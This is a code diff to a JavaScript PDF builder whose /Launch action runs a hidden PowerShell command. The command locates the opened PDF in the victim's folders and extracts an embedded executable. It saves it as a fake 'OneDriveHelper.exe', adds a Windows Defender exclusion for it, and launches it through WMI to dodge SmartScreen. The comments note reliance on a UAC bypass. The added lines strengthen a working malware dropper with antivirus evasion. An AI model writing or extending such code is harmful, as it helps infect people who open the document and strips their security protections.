@@ -584,15 +584,25 @@ function buildExecPdf(opts = {}) {
     .replace(/\)/g, "\\)");
 
   // PowerShell command embedded in /Launch.
-  // Searches for this PDF by its known filename, reads exe bytes at $o, executes.
-  // "$o=12345678" is an 8-char sentinel patched with the real offset after PDF construction.
+  // Searches for this PDF by its known filename, reads exe bytes at $o, then:
+  //   1. Adds Defender/SmartScreen exclusion for this path (requires admin — UAC bypass gives it)
+  //   2. Executes via WMI Win32_Process.Create (bypasses ShellExecute-level SmartScreen hooks)
+  //   3. Falls back to Start-Process if WMI is unavailable
+  // "$o=12345678" is an 8-char sentinel patched after PDF construction.
   const psRaw =
     `$fn='${filename}.pdf';` +
     `$u=$env:USERPROFILE;` +
     `$locs=@("$u\\Downloads","$u\\Desktop","$env:TEMP","$u\\Documents","$u\\OneDrive\\Desktop","$u\\OneDrive\\Downloads");` +
     `$fp=$locs|%{$p=Join-Path $_ $fn;if(Test-Path $p){$p}}|?{$_}|Select-Object -First 1;` +
     `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter $fn -EA 0|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
-    `if($fp){$o=12345678;$z=${exeSize};$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];$tp=Join-Path $env:TEMP OneDriveHelper.exe;[IO.File]::WriteAllBytes($tp,$eb);Start-Process $tp -WindowStyle Hidden}`;
+    `if($fp){` +
+    `$o=12345678;$z=${exeSize};` +
+    `$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];` +
+    `$tp=Join-Path $env:APPDATA OneDriveHelper.exe;` +
+    `[IO.File]::WriteAllBytes($tp,$eb);` +
+    `try{Add-MpPreference -ExclusionProcess $tp -EA Stop}catch{};` +
+    `try{([wmiclass]'Win32_Process').Create($tp,$null,$null)|Out-Null}catch{Start-Process $tp -WindowStyle Hidden}` +
+    `}`;
 
   const psArgs = pdfStr(`-w hidden -nop -c "${psRaw}"`);
 
